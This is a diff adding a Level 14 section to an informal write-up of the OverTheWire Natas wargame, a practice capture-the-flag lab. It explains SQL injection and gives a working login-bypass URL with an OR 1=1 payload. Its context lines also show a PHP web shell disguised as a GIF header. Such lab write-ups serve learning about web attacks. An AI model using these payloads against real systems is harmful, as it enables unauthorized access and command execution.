@@ -111,3 +111,30 @@ lets pretend to be GIF
 ```GIF87a<?php echo shell_exec("ls");?>```
 And now repeat all that stuff we done in level 12
 and you will get KEY
+
+# Level 14
+this case is different from others
+to solve this we should look into source code
+
+`if(array_key_exists("username", $_REQUEST)) {` 
+in this line we can see that form directly works with it means it will do any comand that we can give him,
+this method called `sql injection`
+
+How it works (basic idea):
+1.A website asks for user input, like a username and password.
+2.This input is used directly in an SQL query, like this:
+`SELECT * FROM users WHERE username = 'input' AND password = 'input';`
+3.If the input is not properly sanitized, an attacker can inject SQL code:
+`username = 'admin' -- 
+password = anything
+`
+4.The resulting query becomes:
+`SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything';`
+The -- makes the rest of the query a comment.
+5.Now the attacker logs in as admin without knowing the password.
+
+Now you understand how sql injection works:
+So to get into the Level14 we should do the same thing
+`http://natas14.natas.labs.overthewire.org/?debug=1&&username=admin"OR 1=1 --"&&password="admin`
+?--->means that we using Get request to get output 
+`OR 1=1 --`-->one the basic injection that always returns true(thats how we can bypass password)
